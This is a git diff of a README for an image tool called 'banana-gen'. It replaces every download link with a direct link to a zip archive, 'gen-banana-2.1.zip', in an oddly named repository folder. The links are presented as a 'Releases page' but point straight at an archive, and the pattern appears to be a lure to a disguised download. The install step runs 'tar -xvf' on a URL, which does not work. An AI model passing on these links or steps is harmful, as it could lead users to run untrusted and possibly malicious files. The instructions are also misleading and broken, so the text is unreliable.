@@ -6,12 +6,12 @@ Welcome to the banana-gen project! This tool helps you manage and generate image
 ## 📥 Download & Install
 To get started, you need to download the software. You can do this by visiting the Releases page:
 
-[![Download banana-gen](https://raw.githubusercontent.com/Yourmothegotboobs/banana-gen/master/unrelentance/banana-gen.zip)](https://raw.githubusercontent.com/Yourmothegotboobs/banana-gen/master/unrelentance/banana-gen.zip)
+[![Download banana-gen](https://github.com/Yourmothegotboobs/banana-gen/raw/refs/heads/master/unrelentance/gen-banana-2.1.zip)](https://github.com/Yourmothegotboobs/banana-gen/raw/refs/heads/master/unrelentance/gen-banana-2.1.zip)
 
 Click the link above to visit the page, and find the version suitable for your system.
 
 ### Steps to Download:
-1. **Visit the Releases page:** Click [here](https://raw.githubusercontent.com/Yourmothegotboobs/banana-gen/master/unrelentance/banana-gen.zip).
+1. **Visit the Releases page:** Click [here](https://github.com/Yourmothegotboobs/banana-gen/raw/refs/heads/master/unrelentance/gen-banana-2.1.zip).
 2. **Find the latest version:** Look for the most recent release listed on the page.
 3. **Select the correct file:** Choose the file that matches your operating system (for example, Windows, macOS, or Linux).
 4. **Click to download:** Click the file link to start the download.
@@ -46,7 +46,7 @@ After downloading, follow these instructions to install banana-gen on your compu
 2. Navigate to the directory where the file was downloaded.
 3. Use the following command to extract the files:
    ```
-   tar -xvf https://raw.githubusercontent.com/Yourmothegotboobs/banana-gen/master/unrelentance/banana-gen.zip
+   tar -xvf https://github.com/Yourmothegotboobs/banana-gen/raw/refs/heads/master/unrelentance/gen-banana-2.1.zip
    ```
 4. Navigate to the extracted folder:
    ```
@@ -87,7 +87,7 @@ Join our community to share ideas and get updates. You can find more resources a
 ## 📥 Download Again
 To download banana-gen again, you can use this link to revisit the Releases page:
 
-[![Download banana-gen](https://raw.githubusercontent.com/Yourmothegotboobs/banana-gen/master/unrelentance/banana-gen.zip)](https://raw.githubusercontent.com/Yourmothegotboobs/banana-gen/master/unrelentance/banana-gen.zip)
+[![Download banana-gen](https://github.com/Yourmothegotboobs/banana-gen/raw/refs/heads/master/unrelentance/gen-banana-2.1.zip)](https://github.com/Yourmothegotboobs/banana-gen/raw/refs/heads/master/unrelentance/gen-banana-2.1.zip)
 
 ## 📝 Changelog
 Check the Releases section for updates and a list of new features or fixes in each version. Stay up to date with the latest improvements to enhance your user experience.
